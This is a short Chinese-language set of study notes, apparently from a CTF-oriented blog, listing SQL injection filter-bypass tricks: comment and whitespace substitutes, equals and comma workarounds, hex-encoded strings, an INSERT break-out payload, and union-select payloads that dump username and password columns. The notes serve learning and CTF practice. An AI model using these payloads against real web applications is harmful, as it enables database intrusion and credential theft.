---
title: sql注入技巧
date: '2022/1/23 23:15:01'
categories:
  - - web安全
    - 注入
    - SQL
description: sql注入的一些绕过技巧
abbrlink: 1c713f30
tags:
---


# sql注入技巧

## 1 绕过检查：
### 1.1 注释：
单个的：
```sql
#
%23
-- （两个-加一个空格）
--+
;%00
```
分开两个的：
```sql
/*
*/
```

### 1.2 等号：
```sql
a=a
a like a
a regexp a	(正则)
!(a<>a)
```
### 1.3 or：
```sql
||
```	
### 1.4 空格：
```sql
/**/
and(1=0)		//利用小括号
%09 %0a %0c %0b %0d 	//空白字符
```

> 过滤空格之后检测，可以采用```?id=(1)=(2)```的方法

### 1.5 无法传入字符串：
转换成16进制然后前面加0x

### 1.6 单引号绕过
方法1. 使用单引号的编码%20
方法2. 利用前一个的单引号闭合后面的



## 2 跳过第一个数据的方法：
```sql
limit 1 offset 1
```

> ```limit``` 与 ```offset```：从下标0开始
> ```offset X```   是跳过X个数据
> ```limit Y```    是选取Y个数据
> ```limit  X,Y``` 中X表示跳过X个数据，读取Y个数据

当```limit```后面跟两个参数的时候，第一个数表示要跳过的数量，后一位表示要取的数量,
例如```select* from article LIMIT 1,3``` 就是跳过1条数据,从第2条数据开始取，取3条数据，也就是取2,3,4三条数据

当 ```limit```后面跟一个参数的时候，该参数表示要取的数据的数量
例如```select* from article LIMIT 3```  表示直接取前三条数据，类似sqlserver里的```top```语法。

当 ```limit```和```offset```组合使用的时候，```limit```后面只能有一个参数，表示要取的的数量,```offset```表示要跳过的数量 。
例如```select * from article LIMIT 3 OFFSET 1 ```表示跳过1条数据,从第2条数据开始取，取3条数据，也就是取2,3,4三条数据



## 3 插入函数insert()的相关

> 插入函数格式

```insert(a,'a',a,'a')```  插入一条（一条里面4个变量）
```insert(a,'a',a,'a'),(b,'b',b,'b')```  插入两条（一条里面4个变量）
比如说构造```q'),('a','a',database(),'a')%23```，进行插入两条数据的sql注入
或者放弃最后一个变量，构造```q'),('a',database(),'```，利用第二个可控变量进行sql注入


## 4 当逗号","被过滤后
(1)一般时间延迟盲注都是用 ```if(exp1,exp2,epx3)``` 
逗号被过滤后可以使用 ```select case when (条件) then 代码1 else 代码 2 end```;
(2)在 exp1 中要用到 ```substr()```来进行剪切，这个函数 ```substr(str,1,1)``` 又是存在 ```,``` , 
于是这里又用 ```substr (str) from 1 for 1``` 来绕过```,```的限制


## 5 遇到两张表都有名字叫id，password的字段时
例如：
数据库叫```geek```；在```geek```下有两张表，分别叫```geekuser```,```l0ve1ysq1```
当想查询```l0ve1ysq1```中的```id```，```password```的字段时，
使用```union select 1,2,group_concat(char(58,58,58),id,username,password) from geek.l0ve1ysq1```

## 6 php中preg_match()函数过滤掉字母等东西时
使用```char()```函数绕过，比如说 ```(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))``` 是 ```/flagg ```

## 7 如果当前数据库不是flag所在的数据库，最后得到字段名之后查找应该变成
```union select 1,2,group_concat(char(58,58,58),id,username,password) from ctf.Flag```